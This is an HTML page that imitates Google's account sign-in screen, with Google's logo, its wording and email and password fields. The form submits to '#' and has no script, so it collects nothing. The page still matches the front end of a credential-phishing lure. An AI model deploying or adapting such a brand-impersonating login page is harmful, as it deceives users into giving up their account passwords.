<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .container {
            width: 360px;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .google-logo {
            margin-bottom: 20px;
        }
        .google-logo img {
            width: 75px;
        }
        h1 {
            font-size: 24px;
            color: #202124;
            margin: 0 0 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
        }
        .button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #1558b0;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #5f6368;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        </div>
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="#" method="post">
            <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
            <input type="password" name="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="button">Next</button>
        </form>
        <div class="footer">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <a href="#">Learn more</a>
        </div>
    </div>
</body>
</html>
